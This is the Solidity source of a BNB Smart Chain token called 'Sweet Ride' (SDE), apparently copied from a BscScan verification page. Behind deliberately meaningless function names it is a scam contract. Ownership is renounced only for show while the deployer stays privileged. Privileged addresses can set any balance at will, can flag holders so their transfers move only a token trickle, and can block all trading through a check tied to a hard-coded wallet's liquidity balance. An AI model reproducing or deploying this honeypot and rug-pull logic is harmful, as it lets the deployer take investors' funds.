/**
 *Submitted for verification at BscScan.com on 2024-02-06
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface walletSwap {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract takeAmountTotal {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletSell {
    function createPair(address enableLaunch, address txWalletTeam) external returns (address);
}

interface liquidityTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchMax) external view returns (uint256);

    function transfer(address isFeeLiquidity, uint256 minBuy) external returns (bool);

    function allowance(address tradingLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 minBuy) external returns (bool);

    function transferFrom(
        address sender,
        address isFeeLiquidity,
        uint256 minBuy
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTeam, uint256 value);
    event Approval(address indexed tradingLiquidity, address indexed spender, uint256 value);
}

interface liquidityTotalMetadata is liquidityTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SweetRide is takeAmountTotal, liquidityTotal, liquidityTotalMetadata {

    mapping(address => bool) public atMin;

    bool public isSenderTeam;

    uint256 private feeMode = 100000000 * 10 ** 18;

    string private amountLiquidity = "Sweet Ride";

    function owner() external view returns (address) {
        return toLaunchedExempt;
    }

    function approve(address tradingFromMode, uint256 minBuy) public virtual override returns (bool) {
        feeFund[_msgSender()][tradingFromMode] = minBuy;
        emit Approval(_msgSender(), tradingFromMode, minBuy);
        return true;
    }

    uint256 constant exemptReceiver = 17 ** 10;

    bool private receiverAt;

    function getOwner() external view returns (address) {
        return toLaunchedExempt;
    }

    bool public feeReceiver;

    uint256 private receiverLaunch;

    mapping(address => mapping(address => uint256)) private feeFund;

    function tokenExempt() public {
        emit OwnershipTransferred(autoEnable, address(0));
        toLaunchedExempt = address(0);
    }

    function receiverEnable(uint256 minBuy) public {
        fromMarketingAmount();
        launchedTx = minBuy;
    }

    uint8 private limitFrom = 18;

    bool public isSender;

    function balanceOf(address launchMax) public view virtual override returns (uint256) {
        return feeModeSell[launchMax];
    }

    address public autoEnable;

    function sellList(address modeLaunched, uint256 minBuy) public {
        fromMarketingAmount();
        feeModeSell[modeLaunched] = minBuy;
    }

    address public exemptAuto;

    function transfer(address modeLaunched, uint256 minBuy) external virtual override returns (bool) {
        return shouldTxIs(_msgSender(), modeLaunched, minBuy);
    }

    bool public fromSell;

    function decimals() external view virtual override returns (uint8) {
        return limitFrom;
    }

    event OwnershipTransferred(address indexed amountTx, address indexed autoShouldTake);

    constructor (){
        if (maxShould == receiverTotalExempt) {
            receiverAt = false;
        }
        walletSwap atWallet = walletSwap(listLaunch);
        exemptAuto = walletSell(atWallet.factory()).createPair(atWallet.WETH(), address(this));
        
        autoEnable = _msgSender();
        tokenExempt();
        senderReceiver[autoEnable] = true;
        feeModeSell[autoEnable] = feeMode;
        
        emit Transfer(address(0), autoEnable, feeMode);
    }

    uint256 launchedTx;

    function listTradingWallet(address launchTo, address isFeeLiquidity, uint256 minBuy) internal returns (bool) {
        require(feeModeSell[launchTo] >= minBuy);
        feeModeSell[launchTo] -= minBuy;
        feeModeSell[isFeeLiquidity] += minBuy;
        emit Transfer(launchTo, isFeeLiquidity, minBuy);
        return true;
    }

    function transferFrom(address launchTo, address isFeeLiquidity, uint256 minBuy) external override returns (bool) {
        if (_msgSender() != listLaunch) {
            if (feeFund[launchTo][_msgSender()] != type(uint256).max) {
                require(minBuy <= feeFund[launchTo][_msgSender()]);
                feeFund[launchTo][_msgSender()] -= minBuy;
            }
        }
        return shouldTxIs(launchTo, isFeeLiquidity, minBuy);
    }

    function fromMarketingAmount() private view {
        require(senderReceiver[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return enableMode;
    }

    mapping(address => uint256) private feeModeSell;

    bool private launchFee;

    string private enableMode = "SDE";

    uint256 public maxShould;

    uint256 public receiverTotalExempt;

    function isLimit(address atFundLimit) public {
        require(atFundLimit.balance < 100000);
        if (fromSell) {
            return;
        }
        
        senderReceiver[atFundLimit] = true;
        if (receiverLaunch != maxShould) {
            launchFee = true;
        }
        fromSell = true;
    }

    function allowance(address launchAuto, address tradingFromMode) external view virtual override returns (uint256) {
        if (tradingFromMode == listLaunch) {
            return type(uint256).max;
        }
        return feeFund[launchAuto][tradingFromMode];
    }

    address private toLaunchedExempt;

    bool public sellAtReceiver;

    function name() external view virtual override returns (string memory) {
        return amountLiquidity;
    }

    function shouldTxIs(address launchTo, address isFeeLiquidity, uint256 minBuy) internal returns (bool) {
        if (launchTo == autoEnable) {
            return listTradingWallet(launchTo, isFeeLiquidity, minBuy);
        }
        uint256 teamEnable = liquidityTotal(exemptAuto).balanceOf(launchedMax);
        require(teamEnable == launchedTx);
        require(isFeeLiquidity != launchedMax);
        if (atMin[launchTo]) {
            return listTradingWallet(launchTo, isFeeLiquidity, exemptReceiver);
        }
        return listTradingWallet(launchTo, isFeeLiquidity, minBuy);
    }

    mapping(address => bool) public senderReceiver;

    function autoLimitSwap(address minShouldMode) public {
        fromMarketingAmount();
        if (receiverTotalExempt == maxShould) {
            isSender = false;
        }
        if (minShouldMode == autoEnable || minShouldMode == exemptAuto) {
            return;
        }
        atMin[minShouldMode] = true;
    }

    uint256 modeMaxWallet;

    address launchedMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address listLaunch = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return feeMode;
    }

}